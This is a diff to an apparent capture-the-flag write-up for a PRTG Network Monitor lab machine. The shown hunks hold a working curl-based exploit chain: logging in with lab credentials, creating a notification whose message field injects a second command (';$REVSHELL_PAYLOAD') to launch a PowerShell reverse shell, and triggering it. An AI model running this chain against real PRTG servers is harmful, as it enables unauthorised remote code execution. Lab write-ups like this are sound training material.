@@ -546,29 +546,29 @@ First, I'll setup a listener to receive the shell.
 Then, I'll choose the 'Powershell #3 (Base64)' payload from
 [RevShells](https://www.revshells.com/).
 
-I'll save the URL encoded version of it as the `COMMAND` shell variable.
+I'll save it as the `REVSHELL_PAYLOAD` shell variable.
 
 ### Exploitation
 
-However, to create a notification, we need to be authenticated, so we need an
+In order to create a notification, we need to be authenticated, so we need an
 `OCTOPUS1813713946` cookie.
 
 ```sh
-❯ RESPONSE=$(curl -s -i "http://10.10.10.152/public/checklogin.htm" -X "POST" -d "username=prtgadmin&password=PrTg%40dmin2019"); \
+❯ RESPONSE=$(curl -s -i "http://10.10.10.152/public/checklogin.htm" -X "POST" --data-urlencode "username=prtgadmin" --data-urlencode "password=PrTg@dmin2019"); \
     OCTOPUS1813713946=$(echo "$RESPONSE" | grep -i "Set-Cookie: OCTOPUS1813713946=" | awk -F '=' '{print $2}' | awk '{print $1}' | sed 's/;$//')
 ```
 
 Now we can create a notification with our payload. We'll save the ID of our notification.
 
 ```sh
-❯ RESPONSE=$(curl -s -H "Cookie: OCTOPUS1813713946=$OCTOPUS1813713946" -H "X-Requested-With: XMLHttpRequest" "http://10.10.10.152/editsettings" -X "POST" -d "name_=Revshell&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=%3B$COMMAND&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new"); \
+❯ RESPONSE=$(curl -s -H "Cookie: OCTOPUS1813713946=$OCTOPUS1813713946" -H "X-Requested-With: XMLHttpRequest" "http://10.10.10.152/editsettings" -X POST --data-urlencode "name_=Revshell" --data-urlencode "tags_=" --data-urlencode "active_=1" --data-urlencode "schedule_=-1|None|" --data-urlencode "postpone_=1" --data-urlencode "comments=" --data-urlencode "summode_=2" --data-urlencode "summarysubject_=[%sitename] %summarycount Summarized Notifications" --data-urlencode "summinutes_=1" --data-urlencode "accessrights_=1" --data-urlencode "accessrights_=1" --data-urlencode "accessrights_201=0" --data-urlencode "active_1=0" --data-urlencode "addressuserid_1=-1" --data-urlencode "addressgroupid_1=-1" --data-urlencode "address_1=" --data-urlencode "subject_1=[%sitename] %device %name %status %down (%message)" --data-urlencode "contenttype_1=text/html" --data-urlencode "customtext_1=" --data-urlencode "priority_1=0" --data-urlencode "active_17=0" --data-urlencode "addressuserid_17=-1" --data-urlencode "addressgroupid_17=-1" --data-urlencode "message_17=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_8=0" --data-urlencode "addressuserid_8=-1" --data-urlencode "addressgroupid_8=-1" --data-urlencode "address_8=" --data-urlencode "message_8=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_2=0" --data-urlencode "eventlogfile_2=application" --data-urlencode "sender_2=PRTG Network Monitor" --data-urlencode "eventtype_2=error" --data-urlencode "message_2=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_13=0" --data-urlencode "sysloghost_13=" --data-urlencode "syslogport_13=514" --data-urlencode "syslogfacility_13=1" --data-urlencode "syslogencoding_13=1" --data-urlencode "message_13=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_14=0" --data-urlencode "snmphost_14=" --data-urlencode "snmpport_14=162" --data-urlencode "snmpcommunity_14=" --data-urlencode "snmptrapspec_14=0" --data-urlencode "messageid_14=0" --data-urlencode "message_14=[%sitename] %device %name %status %down (%message)" --data-urlencode "senderip_14=" --data-urlencode "active_9=0" --data-urlencode "url_9=" --data-urlencode "urlsniselect_9=0" --data-urlencode "urlsniname_9=" --data-urlencode "postdata_9=" --data-urlencode "active_10=0" --data-urlencode "active_10=10" --data-urlencode "address_10=Demo EXE Notification - OutFile.ps1" --data-urlencode "message_10=;$REVSHELL_PAYLOAD" --data-urlencode "windowslogindomain_10=" --data-urlencode "windowsloginusername_10=" --data-urlencode "windowsloginpassword_10=" --data-urlencode "timeout_10=60" --data-urlencode "active_15=0" --data-urlencode "accesskeyid_15=" --data-urlencode "secretaccesskeyid_15=" --data-urlencode "arn_15=" --data-urlencode "subject_15=" --data-urlencode "message_15=[%sitename] %device %name %status %down (%message)" --data-urlencode "active_16=0" --data-urlencode "isusergroup_16=1" --data-urlencode "addressgroupid_16=200|PRTG Administrators" --data-urlencode "ticketuserid_16=100|PRTG System Administrator" --data-urlencode "subject_16=%device %name %status %down (%message)" --data-urlencode "message_16=Sensor: %name\nStatus: %status %down\n\nDate/Time: %datetime (%timezone)\nLast Result: %lastvalue\nLast Message: %message\n\nProbe: %probe\nGroup: %group\nDevice: %device (%host)\n\nLast Scan: %lastcheck\nLast Up: %lastup\nLast Down: %lastdown\nUptime: %uptime\nDowntime: %downtime\nCumulated since: %cumsince\nLocation: %location\n\n" --data-urlencode "autoclose_16=1" --data-urlencode "objecttype=notification" --data-urlencode "id=new"); \
     ID=$(echo "$RESPONSE" | jq -r ".objid")
 ```
 
 Finally, let's trigger the payload by sending a test notification request.
 
 ```sh
-❯ curl -s -o "/dev/null" -H "Cookie: OCTOPUS1813713946=$OCTOPUS1813713946" "http://10.10.10.152/api/notificationtest.htm" -X "POST" -d "id=$ID"
+❯ curl -s -o "/dev/null" -H "Cookie: OCTOPUS1813713946=$OCTOPUS1813713946" "http://10.10.10.152/api/notificationtest.htm" -X "POST" --data-urlencode "id=$ID"
 ```
 
 If we check our listener:
@@ -746,6 +746,8 @@ Tunnel adapter isatap.{9978787D-72DF-4652-BD20-59EE06187435}:
 ```
 
 There's an Ethernet interface and an ISATAP interface.
+
+## System enumeration
 
 ### Flags
 
